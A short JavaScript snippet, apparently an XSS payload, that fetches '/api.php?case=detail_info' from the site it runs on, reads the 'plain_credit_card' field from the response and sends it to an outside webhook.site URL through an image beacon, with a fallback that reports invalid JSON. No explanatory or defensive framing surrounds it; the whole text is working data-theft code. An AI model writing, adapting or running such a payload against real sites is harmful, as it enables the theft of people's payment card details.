fetch("/api.php?case=detail_info")
  .then(res => {
    console.log("Status:", res.status);
    return res.text();
  })
  .then(txt => {
    console.log("Raw response:", txt);
    try {
      const data = JSON.parse(txt);
      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(data.plain_credit_card || 'N/A');
    } catch (e) {
      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=INVALID_JSON";
    }
  });
